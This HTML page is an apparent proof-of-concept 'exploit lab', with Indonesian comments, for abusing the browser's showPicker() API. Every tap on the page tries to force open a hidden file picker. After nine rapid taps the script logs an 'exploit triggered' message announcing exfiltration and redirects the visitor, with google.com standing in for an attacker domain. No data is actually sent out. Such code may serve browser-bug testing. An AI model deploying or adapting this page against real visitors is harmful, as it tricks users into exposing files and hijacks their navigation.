<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Advanced Picker & Redirection Lab</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #121212;
            color: #e0e0e0;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-end;
            min-height: 90vh;
            cursor: pointer;
        }
        h1 { color: #ff5252; font-size: 18px; margin-bottom: 5px; }
        .info-box {
            background: #1e1e1e; border: 1px solid #333; padding: 10px;
            border-radius: 6px; max-width: 500px; width: 100%; font-size: 11px;
            color: #b0b0b0; margin-top: 15px; text-align: left; max-height: 150px; overflow-y: auto;
        }
        code { background: #2d2d2d; color: #ff8a80; padding: 2px 4px; border-radius: 3px; font-family: monospace; }
        .interactive-zone { position: relative; margin-bottom: 20px; width: 100%; display: flex; flex-direction: column; align-items: center; }
        .target-button {
            background: #ff5252; color: white; border: none; padding: 12px 24px;
            font-size: 14px; border-radius: 4px; cursor: pointer; font-weight: bold;
        }
    </style>
</head>
<body>

    <h1>🔴 High-Frequency Picker & Redirection Exploit Lab</h1>
    <p style="font-size: 12px; color: #888;">Ketuk layar secara cepat untuk memicu file picker dan pengalihan otomatis.</p>

    <div class="interactive-zone">
        <!-- Input file tersembunyi yang dipanggil secara programatik via showPicker() -->
        <input id="file-input" type="file" style="display:none;" />
        <button class="target-button">Tap Area / Interact Here</button>
    </div>

    <div class="info-box" id="log-box">
        <strong>Status Log:</strong> Menunggu interaksi sentuh (*pointerdown*)...
    </div>

<script>
    const logBox = document.getElementById('log-box');
    function appendLog(msg) {
        console.log(msg);
        logBox.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${msg}`;
        logBox.scrollTop = logBox.scrollHeight;
    }

    let clickCount = 0;
    const fileInput = document.getElementById('file-input');
    const targetThreshold = 9; // Jumlah ketukan cepat yang dibutuhkan untuk memicu eksploitasi

    // Menangkap perubahan pada file input (jika file berhasil dipilih/diakses)
    fileInput.addEventListener('change', (e) => {
        if (e.target.files.length > 0) {
            const fileName = e.target.files[0].name;
            appendLog(`<span style="color: #4CAF50;">[Success] File terdeteksi & diakses: <b>${fileName}</b></span>`);
        }
    });

    document.body.addEventListener('pointerdown', (e) => {
        clickCount++;
        appendLog(`Pointer down terdeteksi (Hitungan: ${clickCount}/${targetThreshold})`);

        try {
            // Memaksa pemanggilan showPicker() pada elemen file
            fileInput.showPicker();
        } catch (err) {
            // Mengabaikan error DOM exception jika belum memenuhi syarat aktivasi murni secara normal
        }

        if (clickCount >= targetThreshold) {
            appendLog(`<span style="color: #ff8a80;">[Exploit Triggered] Batas ketukan tercapai. Memproses eksfiltrasi & pengalihan...</span>`);
            
            // Jeda singkat sebelum dialihkan ke domain penyerang (simulasi diarahkan ke google.com)
            setTimeout(() => {
                appendLog(`[Redirecting] Mengalihkan ke halaman attacker/eksternal...`);
                window.location.href = "https://www.google.com";
            }, 1200);

            clickCount = 0;
        }
    }, { passive: true });
</script>

</body>
</html>
